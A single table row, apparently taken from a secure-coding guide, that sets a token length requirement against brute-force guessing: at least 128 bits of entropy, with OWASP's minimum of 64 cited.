| Long enough | Brute force infeasible | At least 128 bits of entropy (OWASP recommends at least 64; more is cheap) |
